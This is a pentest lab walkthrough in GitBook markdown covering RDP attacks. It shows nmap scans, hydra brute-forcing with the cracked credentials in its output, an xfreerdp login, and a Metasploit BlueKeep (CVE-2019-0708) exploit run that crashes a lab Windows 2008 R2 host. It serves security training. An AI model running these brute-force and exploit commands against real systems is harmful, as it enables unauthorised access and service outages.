# 🔬RDP

## Lab 1

> 🔬 [Windows: Insecure RDP Service](https://attackdefense.com/challengedetails?cid=1957)
>
> * Target IP: `10.4.18.131`
> * **RDP** exploitation
> * Dictionaries to use:
>   * `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
>   * `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

### Enumeration

```bash
nmap -sV 10.0.17.61
```

```bash
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-30 17:54 IST
Nmap scan report for 10.0.17.61
Host is up (0.0021s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3333/tcp  open  ssl/dec-notes?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.33 seconds
```

{% hint style="info" %}
RDP can be configured to run on another port instead of the default port
{% endhint %}

> Port 3333 instead of port 3339 is open but no service due to port is not assigned to any services.

* Use Metasploit [rdp\_scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/rdp/rdp\_scanner/) module to check if port `3333` is running RDP.
* Useful when performing black-box penetration test

```bash
msf5 > search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
```

<pre class="language-bash"><code class="lang-bash">msf5 > use auxiliary/scanner/rdp/rdp_scanner
msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.0.17.61
<strong>msf5 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333 # default port 3389
</strong>msf5 auxiliary(scanner/rdp/rdp_scanner) > run
</code></pre>

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>RDP Detected</p></figcaption></figure>

> The RDP is running on target port `3333`

### RDP Brute Force

* Use hydra to find the valid `username` and `password` by using the dictionary wordlists

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt
```

{% hint style="warning" %}
Make sure to adjust the speed when performing the real world penetration test using `-t <default 16>` to prevent Denial of Services (DOS) or crashing the `Windows` system.
{% endhint %}

```bash
sts/unix_passwords.txt rdp://10.0.17.61 -s 3333
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 18:12:55
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
[DATA] attacking rdp://10.0.17.61:3333/
[3333][rdp] host: 10.0.17.61   login: sysadmin   password: samantha
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.0.17.61   login: demo   password: victoria
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.0.17.61   login: auditor   password: elizabeth
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.0.17.61   login: administrator   password: qwertyuiop
[ERROR] freerdp: The connection failed to establish.
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 18:13:35
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* In this case, `freerdp` cannot be used in this lab, the only RDP client that can be used is `xfreerdp`.

```bash
xfreerdp  /u:Administrator /p:qwertyuiop /v:10.0.17.61:3333
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `port-number-3333`
{% endhint %}

***

## Lab 2 - Blue Keep

> 🔬 **Extra Lab**
>
> Setup a vulnerable _Windows 2008 R2 Virtual Machine_ and connected it to the same network of the Kali virtual machine.
>
> * Host system: `Kali Linux`
> * Target system: `Windows Server 2008 R2`&#x20;
> * Target IP: `192.168.42.139`&#x20;
> * Local IP: `192.168.42.132`
> * Exploitation tool:
> * Vulnerability: [CVE-2019-0708 - BlueKeep](https://nvd.nist.gov/vuln/detail/CVE-2019-0708)

{% hint style="danger" %}
Targeting Kernel space memory and apps can cause system crashes.
{% endhint %}

### Enumeration

```bash
nmap -sV -sC 192.168.42.139 -Pn   
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 22:36 +08
Nmap scan report for 192.168.42.139
Host is up (0.0029s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Standard 7600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WIN-8M9K4MEH6MB
|   NetBIOS_Domain_Name: WIN-8M9K4MEH6MB
|   NetBIOS_Computer_Name: WIN-8M9K4MEH6MB
|   DNS_Domain_Name: WIN-8M9K4MEH6MB
|   DNS_Computer_Name: WIN-8M9K4MEH6MB
|   Product_Version: 6.1.7600
|_  System_Time: 2024-07-04T14:37:17+00:00
| ssl-cert: Subject: commonName=WIN-8M9K4MEH6MB
| Not valid before: 2024-07-03T14:36:09
|_Not valid after:  2025-01-02T14:36:09
|_ssl-date: 2024-07-04T14:37:57+00:00; 0s from scanner time.
49154/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

<figure><img src="../../../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

> RDP port 3389 is opened.

* Run `metasploit` auxiliary module to check the target expose to the BlueKeep vulnerability or not.

```bash
msfconsole
msf6 > search bluekeep
msf6 > use 0
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS 192.168.42.139
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> The target is vulnerable

### Exploitation

```bash
msf6 > use 3
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 5
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.42.139
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
```

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> And boom it crashed&#x20;







